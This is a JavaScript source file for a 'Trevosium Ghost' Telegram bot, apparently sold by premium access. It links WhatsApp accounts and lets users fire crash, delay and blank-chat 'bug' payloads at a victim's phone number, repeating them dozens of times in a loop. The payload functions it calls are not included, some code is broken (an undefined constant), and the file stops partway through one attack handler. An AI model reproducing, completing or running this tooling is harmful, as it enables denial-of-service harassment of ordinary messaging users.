const {
  default: makeWASocket,
  useMultiFileAuthState,
  downloadContentFromMessage,
  emitGroupParticipantsUpdate,
  emitGroupUpdate,
  generateWAMessageContent,
  generateWAMessage,
  makeInMemoryStore,
  prepareWAMessageMedia,
  generateWAMessageFromContent,
  MediaType,
  areJidsSameUser,
  WAMessageStatus,
  downloadAndSaveMediaMessage,
  AuthenticationState,
  GroupMetadata,
  initInMemoryKeyStore,
  getContentType,
  MiscMessageGenerationOptions,
  useSingleFileAuthState,
  BufferJSON,
  WAMessageProto,
  MessageOptions,
  WAFlag,
  WANode,
  WAMetric,
  ChatModification,
  MessageTypeProto,
  WALocationMessage,
  ReconnectMode,
  WAContextInfo,
  proto,
  WAGroupMetadata,
  ProxyAgent,
  waChatKey,
  MimetypeMap,
  MediaPathMap,
  WAContactMessage,
  WAContactsArrayMessage,
  WAGroupInviteMessage,
  WATextMessage,
  WAMessageContent,
  WAMessage,
  BaileysError,
  WA_MESSAGE_STATUS_TYPE,
  MediaConnInfo,
  URL_REGEX,
  WAUrlInfo,
  WA_DEFAULT_EPHEMERAL,
  WAMediaUpload,
  jidDecode,
  mentionedJid,
  processTime,
  Browser,
  MessageType,
  Presence,
  WA_MESSAGE_STUB_TYPES,
  Mimetype,
  relayWAMessage,
  Browsers,
  GroupSettingChange,
  DisconnectReason,
  WASocket,
  getStream,
  WAProto,
  isBaileys,
  AnyMessageContent,
  fetchLatestBaileysVersion,
  templateMessage,
  InteractiveMessage,
  Header,
} = require("@whiskeysockets/baileys");
const fs = require("fs-extra");
const P = require("pino");
const crypto = require("crypto");
const path = require("path");
const sessions = new Map();
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
let premiumUsers = JSON.parse(fs.readFileSync("./database/premium.json"));
let adminUsers = JSON.parse(fs.readFileSync("./database/admin.json"));
function sessionPath(number) {
  return path.join(SESSIONS_DIR, `device${number}`);
}
function ensureFileExists(filePath, defaultData = []) {
  if (!fs.existsSync(filePath)) {
    fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
  }
}
ensureFileExists("./database/premium.json");
ensureFileExists("./database/admin.json");
// Fungsi untuk menyimpan data premium dan admin
function savePremiumUsers() {
  fs.writeFileSync(
    "./database/premium.json",
    JSON.stringify(premiumUsers, null, 2)
  );
}

function saveAdminUsers() {
  fs.writeFileSync(
    "./database/admin.json",
    JSON.stringify(adminUsers, null, 2)
  );
}
// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
  fs.watch(filePath, (eventType) => {
    if (eventType === "change") {
      try {
        const updatedData = JSON.parse(fs.readFileSync(filePath));
        updateCallback(updatedData);
        console.log(`File ${filePath} updated successfully.`);
      } catch (error) {
        console.error(`Error updating ${filePath}:`, error.message);
      }
    }
  });
}
watchFile("./database/premium.json", (data) => (premiumUsers = data));
watchFile("./database/admin.json", (data) => (adminUsers = data));
const axios = require("axios");
const chalk = require("chalk"); // Import chalk untuk warna
const config = require("./Архиарақәа/config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/Mirzzasep/Mirzzdatabase/main/tokens.json"; // Ganti dengan URL GitHub yang benar

const EXPECTED_HASH = crypto.createHash("sha256").update(TOKEN_DATABASE).digest("hex");

function verifyDatabaseIntegrity(url) {
  const currentHash = crypto.createHash("sha256").update(url).digest("hex");
  if (currentHash !== EXPECTED_HASH) {
    console.log(chalk.red.bold("🔍 ANTI BYPASS ACTIVE"));
    process.exit(1);
  }
}

process.on("uncaughtException", (err) => {
  if (String(err).includes("axios") || String(err).includes("fetch")) {
    console.log(chalk.red("🛡️ BYPASS TERDETEKSI"));
    process.exit(1);
  }
});

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    return response.data.tokens; // Asumsikan format JSON: { "tokens": ["TOKEN1", "TOKEN2", ...] }
  } catch (error) {
    console.error(
      chalk.red("❌ Gagal mengambil daftar token dari GitHub:", error.message)
    );
    return [];
  }
}
async function validateToken() {
  console.log(chalk.blue("🔍 Memeriksa apakah token bot valid..."));
  const validTokens = await fetchValidTokens();
  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ Token tidak valid! Bot tidak dapat dijalankan."));
    process.exit(1);
  }
  console.log(chalk.green(` #- Token Valid⠀⠀`));
  startBot();
  initializeWhatsAppConnections();
}
const bot = new TelegramBot(BOT_TOKEN, {
  polling: true,
});

function startBot() {
  console.log(
    chalk.red(`
⠀⠀⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡀⠀⠀
⠀⣠⠾⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡟⢦⠀
⢰⠇⠀⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠈⣧
⠘⡇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡞⠀⠀⣿
⠀⡇⠘⡄⢱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⢁⡆⢀⡏
⠀⠹⣄⠹⡀⠙⣄⠀⠀⠀⠀⠀⢀⣤⣴⣶⣶⣶⣾⣶⣶⣶⣶⣤⣀⠀⠀⠀⠀⠀⢀⠜⠁⡜⢀⡞⠀
⠀⠀⠘⣆⢣⡄⠈⢣⡀⢀⣤⣾⣿⣿⢿⠉⠉⠉⠉⠉⠉⠉⣻⢿⣿⣷⣦⣄⠀⡰⠋⢀⣾⢡⠞⠀⠀
⠀⠀⠀⠸⣿⡿⡄⡀⠉⠙⣿⡿⠁⠈⢧⠃⠀⠀⠀⠀⠀⠀⢷⠋⠀⢹⣿⠛⠉⢀⠄⣞⣧⡏⠀⠀⠀
⠀⠀⠀⠀⠸⣿⣹⠘⡆⠀⡿⢁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢻⡆⢀⡎⣼⣽⡟⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣹⣿⣇⠹⣼⣷⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢷⣳⡜⢰⣿⣟⡀⠀⠀⠀⠀
⠀⠀⠀⠀⡾⡉⠛⣿⠴⠳⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠳⢾⠟⠉⢻⡀⠀⠀⠀
⠀⠀⠀⠀⣿⢹⠀⢘⡇⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⡏⠀⡼⣾⠇⠀⠀⠀
⠀⠀⠀⠀⢹⣼⠀⣾⠀⣀⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⣄⡀⢹⠀⢳⣼⠀⠀⠀⠀
⠀⠀⠀⠀⢸⣇⠀⠸⣾⠁⠀⠀⠀⠀⠀⢀⡾⠀⠀⠀⠰⣄⠀⠀⠀⠀⠀⠀⣹⡞⠀⣀⣿⠀⠀⠀⠀
⠀⠀⠀⠀⠈⣇⠱⡄⢸⡛⠒⠒⠒⠒⠚⢿⣇⠀⠀⠀⢠⣿⠟⠒⠒⠒⠒⠚⡿⢀⡞⢹⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⡞⢰⣷⠀⠑⢦⣄⣀⣀⣠⠞⢹⠀⠀⠀⣸⠙⣤⣀⣀⣀⡤⠞⠁⢸⣶⢸⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠰⣧⣰⠿⣄⠀⠀⠀⢀⣈⡉⠙⠏⠀⠀⠀⠘⠛⠉⣉⣀⠀⠀⠀⢀⡟⣿⣼⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢀⡿⠀⠘⠷⠤⠾⢻⠞⠋⠀⠀⠀⠀⠀⠀⠀⠘⠛⣎⠻⠦⠴⠋⠀⠹⡆⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠸⣿⡀⢀⠀⠀⡰⡌⠻⠷⣤⡀⠀⠀⠀⠀⣠⣶⠟⠋⡽⡔⠀⡀⠀⣰⡟⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⢷⣄⡳⡀⢣⣿⣀⣷⠈⠳⣦⣀⣠⡾⠋⣸⡇⣼⣷⠁⡴⢁⣴⠟⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠈⠻⣶⡷⡜⣿⣻⠈⣦⣀⣀⠉⠀⣀⣠⡏⢹⣿⣏⡼⣡⡾⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣻⡄⠹⡙⠛⠿⠟⠛⡽⠀⣿⣻⣾⣿⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢿⡏⢏⢿⡀⣹⢲⣶⡶⢺⡀⣴⢫⢃⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠈⠷⠭⠽⠛⠛⠛⠋⠭⠴⠋⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⣷⣄⡀⢀⣀⣠⣀⣀⢀⣀⣴⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠀⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
`)
  );
  console.log(
    chalk.red(`
═════════    
═════════════════════════
 T R E V O S I U M - G H O S T
═════════════════════════
═════════
`)
  );
  console.log(
    chalk.blue(`
[ 🚀 Bot Trevosium Berjalan ]...
`)
  );
}
validateToken();
let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}
async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`);
      for (const botNumber of activeNumbers) {
        console.log(`Mencoba menghubungkan WhatsApp: ${botNumber}`);
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
        sock = makeWASocket({
          auth: state,
          printQRInTerminal: true,
          logger: P({
            level: "silent",
          }),
          defaultQueryTimeoutMs: undefined,
        });
        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(`Bot ${botNumber} terhubung!`);
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(`Mencoba menghubungkan ulang bot ${botNumber}...`);
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });
          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, {
      recursive: true,
    });
  }
  return deviceDir;
}

function extractGroupID(link) {
  try {
    if (link.includes("chat.whatsapp.com/")) {
      return link.split("chat.whatsapp.com/")[1];
    }
    return null;
  } catch {
    return null;
  }
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `
\`\`\`
━━━━━━━━━━━━━━━━━━
▢ Menyiapkan Kode Pairing
╰➤ Number: ${botNumber}
━━━━━━━━━━━━━━━━━━
\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `
\`\`\`
━━━━━━━━━━━━━━━━━━
▢ Memproses Connecting
╰➤ Number: ${botNumber}
╰➤ Status: ⏳ Connecting...
━━━━━━━━━━━━━━━━━━
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`
━━━━━━━━━━━━━━━━━━
▢ Connection Gagal.
╰➤ Number: ${botNumber}
╰➤ Status: ❌ Gagal
━━━━━━━━━━━━━━━━━━
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `
\`\`\`
━━━━━━━━━━━━━━━━━━
▢ Connection Succes
╰➤ Number: ${botNumber}
╰➤ Status: Sukses Connect.
━━━━━━━━━━━━━━━━━━
\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
  const code = await sock.requestPairingCode(botNumber);
  const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;

  await bot.editMessageText(
    `
\`\`\`
━━━━━━━━━━━━━━━━━━
▢ Code Pairing Kamu
╰➤ Number: ${botNumber}
╰➤ Code: ${formattedCode}
━━━━━━━━━━━━━━━━━━
\`\`\`
`,
    {
      chat_id: chatId,
      message_id: statusMessage,
      parse_mode: "Markdown",
  });
};
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`
━━━━━━━━━━━━━━━━━━
▢ Menyiapkan Kode Pairing
╰➤ Number: ${botNumber}
╰➤ Status: ${error.message} Error⚠️
━━━━━━━━━━━━━━━━━━
\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}
//-# Fungsional Function Before Parameters
//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}
const startTime = Math.floor(Date.now() / 1000); // Simpan waktu mulai bot
function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}
//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); // Panggil fungsi yang sudah dibuat
}
//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = {
    weekday: "long",
    year: "numeric",
    month: "long",
    day: "numeric",
  };
  return now.toLocaleDateString("id-ID", options); // Format: Senin, 6 Maret 2025
}
// Get Random Image
function getRandomImage() {
  const images = ["https://files.catbox.moe/dt5c26.jpg"];
  return images[Math.floor(Math.random() * images.length)];
}
// ~ Coldown
const cooldowns = new Map();
const cooldownTime = 5 * 60 * 1000; // 5 menit dalam milidetik
function checkCooldown(userId) {
  if (cooldowns.has(userId)) {
    const remainingTime = cooldownTime - (Date.now() - cooldowns.get(userId));
    if (remainingTime > 0) {
      return Math.ceil(remainingTime / 1000); // Sisa waktu dalam detik
    }
  }
  cooldowns.set(userId, Date.now());
  setTimeout(() => cooldowns.delete(userId), cooldownTime);
  return 0; // Tidak dalam cooldown
}
// [ BUG FUNCTION ]



/////---------------[sleep function]------_-_
function isOwner(userId) {
  return config.OWNER_ID.includes(userId.toString());
}
const bugRequests = {};
bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  const randomImage = getRandomImage();

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, randomImage, {
      caption: `<blockquote>у нас нет доступа ( ☄️ ).</blockquote>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [
            {
              text: "Owner",
              url: "https://t.me/XavienZzTamvan",
            },
          ],
        ],
      },
    });
  }
  bot.sendPhoto(chatId, randomImage, {
    caption: `—( 𖥊 ) Привет, друзья, я здесь. Xavienzz Рекомендую скрипт Bug bot Telegram С различными функциями!!!

<blockquote>⬡═—⊱「 Trevosium Ghost 」⊰—═⬡</blockquote>
▢ Author : @XavienZzTamvan
▢ Version : Private
▢ Language : JavaScript
▢ Prefix : (/)
▢ Runtime : ${runtime}
▢ Type : ( Case - Plugins )
 
<blockquote>[ ! ] Press Button Menu!!!</blockquote>
`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          {
            text: "👾☇ Attack",
            callback_data: "bugmenu",
          },
        ],
        [
          {
            text: "🧬☇ Access",
                callback_data: "ownermenu",
          },
          {
            text: "👥☇ Thanks To",
            callback_data: "thanksto",
          }, 
        ],
        [ 
          {
            text: "༽⌜ Author ⌟༼", 
            url: "https://t.me/XavienZzTamvan"
          },
        ],
      ],
    },
  });
});
bot.on("callback_query", (callbackQuery) => {
  const chatId = callbackQuery.message.chat.id;
  const messageId = callbackQuery.message.message_id;
  const data = callbackQuery.data;
  const newImage = getRandomImage();
  const runtime = getBotRuntime();
  const date = getCurrentDate();
  let newCaption = "";
  let newButtons = [];
  if (data === "bugmenu") {
    newCaption = `<blockquote>⬡═━〣 Bug Option 〣━═⬡</blockquote>
┌──────────◌
├──☒ /DelayInvisible 628xxx
├──────◌
├──☒ /BlankChat 628xxx
├──────◌
├──☒ /CrashUi 628xxx
├──────◌
├──☒ /Ios 628xxx
├──────◌
├──☒ /FixedBug - Menghapus Bug
├──────◌
└──────────◌
`;
    newButtons = [
      [
        {
          text: "ʙᴀᴄᴋ ",
          callback_data: "mainmenu",
        },
      ],
    ];
  } else if (data === "ownermenu") {
    newCaption = `<blockquote>⬡═━〣 Control Menu 〣━═⬡</blockquote>
┌──────────◌
├──☒ /addprem - id ☇ days
├──────◌
├──☒ /delprem - id
├──────◌
├──☒ /addadmin - id
├──────◌
├──☒ /deladmin - id
├──────◌
├──☒ /listprem
├──────◌
├──☒ /addsender - 62xxx
├──────◌
├──☒ /listsender
├──────◌
└──────────◌
`;
    newButtons = [
      [
        {
          text: "ʙᴀᴄᴋ ",
          callback_data: "mainmenu",
        },
      ],
    ];
  } else if (data === "thanksto") {
    newCaption = `<blockquote>( 👥 ) Thanks ☇ Too
 ▢ Isi Aja ( Author )
</blockquote>`;
    newButtons = [
      [
        {
          text: "ʙᴀᴄᴋ ",
          callback_data: "mainmenu",
        },
      ],
    ];
  } else if (data === "mainmenu") {
    newCaption = `—( 𖥊 ) Привет, друзья, я здесь. Xavienzz Рекомендую скрипт Bug bot Telegram С различными функциями!!!

<blockquote>⬡═—⊱「 Trevosium Ghost 」⊰—═⬡</blockquote>
▢ Author : @XavienZzTamvan
▢ Version : Private
▢ Language : JavaScript
▢ Prefix : (/)
▢ Runtime : ${runtime}
▢ Type : ( Case - Plugins )
 
<blockquote>[ ! ] Press Button Menu!!!</blockquote>
`;
    newButtons = [
      [
          {
            text: "👾☇ Attack",
            callback_data: "bugmenu",
          },
        ],
        [
          {
            text: "🧬☇ Access",
                callback_data: "ownermenu",
          },
          {
            text: "👥☇ Thanks To",
            callback_data: "thanksto",
          }, 
        ],
        [ 
          {
            text: "༽⌜ Author ⌟༼", 
            url: "https://t.me/XavienZzTamvan"
          },
        ],
    ];
  }
  bot
    .editMessageMedia(
      {
        type: "photo",
        media: newImage,
        caption: newCaption,
        parse_mode: "HTML",
      },
      {
        chat_id: chatId,
        message_id: messageId,
      }
    )
    .then(() => {
      bot.editMessageReplyMarkup(
        {
          inline_keyboard: newButtons,
        },
        {
          chat_id: chatId,
          message_id: messageId,
        }
      );
    })
    .catch((err) => {
      console.error("Error editing message:", err);
    });
});


//// -------------- ( CASE BUG ) -------------- \\\\
bot.onText(/\/DelayInvisible (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const imagePath = "./Ghost/「 𖣂 ᳟ᜌうございます 」.jpg";

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, "https://files.catbox.moe/dt5c26.jpg", {
      caption: `\`\`\`!! Not Access Premium!!\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "( 🍁 )", url: "https://t.me/XavienZzTamvan" },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    const sentMessage = await bot.sendDocument(chatId, imagePath, {
      caption: `
<blockquote>「 Trevosium-Attack° 🦠 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /DelayInvisible</b>
<b> ▢ Прогресс : [░░░░░░░░░░] 0%</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
      parse_mode: "HTML",
    });

    const progressStages = [
      { text: "[█░░░░░░░░░]", delay: 200 },
      { text: "[███░░░░░░░]", delay: 200 },
      { text: "[█████░░░░░]", delay: 100 },
      { text: "[███████░░░]", delay: 100 },
      { text: "[█████████░]", delay: 100 },
      { text: "[██████████] Success......", delay: 200 },
    ];

    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
<blockquote>「 Trevosium-Attack° 🦠 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /DelayInvisible</b>
<b> ▢ Прогресс :  ${stage.text}</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
        }
      );
    }
    for (let i = 0; i < 100; i++) {    
      await DelayXql(jid, false);
      await StickerXql(jid, false);
    }
    
    console.log(chalk.blue(`( ✓ ) Succesfully Sending Bug`));

    await bot.editMessageCaption(
      `
<blockquote>「 Trevosium-Attack° 🦠 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /DelayInvisible</b>
<b> ▢ Прогресс :  [██████████] 100%</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "ʙᴀᴄᴋ ↺", callback_data: `bugmenu` }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});
bot.onText(/\/BlankChat (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const imagePath = "./Ghost/「 𖣂 ᳟ᜌうございます 」.jpg";

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, "https://files.catbox.moe/dt5c26.jpg", {
      caption: `\`\`\`!! Not Access Premium!!\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "( 🍁 )", url: "https://t.me/XavienZzTamvan" },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    const sentMessage = await bot.sendDocument(chatId, imagePath, {
      caption: `
<blockquote>「 Trevosium-Attack° 🦠 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /BlankChat</b>
<b> ▢ Прогресс : [░░░░░░░░░░] 0%</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
      parse_mode: "HTML",
    });

    const progressStages = [
      { text: "[█░░░░░░░░░]", delay: 200 },
      { text: "[███░░░░░░░]", delay: 200 },
      { text: "[█████░░░░░]", delay: 100 },
      { text: "[███████░░░]", delay: 100 },
      { text: "[█████████░]", delay: 100 },
      { text: "[██████████] Success......", delay: 200 },
    ];

    for (const stage of progressStages) {
      await new Promise((resolve) => setTimeout(resolve, stage.delay));
      await bot.editMessageCaption(
        `
<blockquote>「 Trevosium-Attack° 🦠 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /BlankChat</b>
<b> ▢ Прогресс :  ${stage.text}</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
        {
          chat_id: chatId,
          message_id: sentMessage.message_id,
          parse_mode: "HTML",
        }
      );
    }

    for (let i = 0; i < 30; i++) {
    await blanks(jid, true);
    await VampireNewSticker(jid, true);
    await VampireSticker(jid, true);
     }
     
    console.log(chalk.blue(`( ✓ ) Succesfully Sending Bug`));
    
    await bot.editMessageCaption(
      `
<blockquote>「 Trevosium-Attack° 🦠 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /BlankChat</b>
<b> ▢ Прогресс :  [██████████] 100%</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
      {
        chat_id: chatId,
        message_id: sentMessage.message_id,
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [[{ text: "ʙᴀᴄᴋ ↺", callback_data: `bugmenu` }]],
        },
      }
    );
  } catch (error) {
    bot.sendMessage(chatId, `❌ Gagal mengirim bug: ${error.message}`);
  }
});

bot.onText(/\/CrashUi (\d+)/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const targetNumber = match[1];
  const date = getCurrentDate();
  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
  const jid = `${formattedNumber}@s.whatsapp.net`;
  const imagePath = "./Ghost/「 𖣂 ᳟ᜌうございます 」.jpg";

  if (
    !premiumUsers.some(
      (user) => user.id === senderId && new Date(user.expiresAt) > new Date()
    )
  ) {
    return bot.sendPhoto(chatId, "https://files.catbox.moe/dt5c26.jpg", {
      caption: `\`\`\`!! Not Access Premium!!\`\`\``,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [
            { text: "( 🍁 )", url: "https://t.me/XavienZzTamvan" },
          ],
        ],
      },
    });
  }

  try {
    if (sessions.size === 0) {
      return bot.sendMessage(
        chatId,
        "❌ Tidak ada bot WhatsApp yang terhubung. Silakan hubungkan bot terlebih dahulu dengan /addsender 62xxx"
      );
    }

    const sentMessage = await bot.sendDocument(chatId, imagePath, {
      caption: `
<blockquote>「 Trevosium-Attack° 🦠 」</blockquote>
<b> ▢ Целевой номер : ${formattedNumber}@s.whatsapp.net</b>
<b> ▢ Меню : /CrashUi</b>
<b> ▢ Прогресс : [░░░░░░░░░░] 0%</b>
<b> ▢ Дата сейчас : ${date}</b>

<blockquote><b>🦋 このバグを最大限に活用してください。</b></blockquote>
`,
      parse_mode: "HTML",
    });

    const progressStages = [
      { text: "[█░░░░░░░░░]", delay: 200 },
